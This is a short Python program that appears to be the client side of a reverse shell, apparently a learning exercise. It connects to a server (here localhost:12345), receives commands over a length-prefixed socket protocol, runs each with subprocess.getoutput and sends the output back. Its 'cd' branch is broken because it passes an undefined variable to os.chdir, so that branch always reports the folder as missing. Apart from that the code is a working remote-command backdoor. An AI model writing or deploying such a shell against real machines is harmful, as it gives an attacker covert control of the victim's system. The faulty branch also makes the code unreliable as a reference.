import socket
import subprocess
import struct
import os

ip = "localhost"
port = 12345
bufsize = 4096

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect((ip, port))
    print("connection succefully to server")

except:
    print("connection error to server")

def send_message(client_socket, message):
    longueur_message = len(message.encode())
    client_socket.sendall(struct.pack("!I", longueur_message))
    client_socket.sendall(message.encode())

def receive_message(client_socket):
    get_data_len = client_socket.recv(4)
    message_len = struct.unpack("!I", get_data_len)[0]

    message = b""
    while len(message) < message_len:
        chunk = message_len - len(message)
        chunk_size = bufsize if chunk > bufsize else chunk
        data = client_socket.recv(chunk_size)
        message += data
    return message.decode()

while True:
    command = receive_message(client)
    print("server send", command)
    if command == "":
        continue


    elif command.startswith("cd"):
        folder = command.split(" ")[1]
        try:
            os.chdir(repertoire)
            msg = f"current path {os.getcwd()}"
            send_message(client, msg)
        except:
            msg = f"folder {folder} not found"
            send_message(client, msg)
        continue


    else:
        output = subprocess.getoutput(command)
        len_output = len(output.encode())
        print("size of message", len_output, "octects")
        if len_output == 0:
            len_output = 1

        send_message(client, output)

client.close()

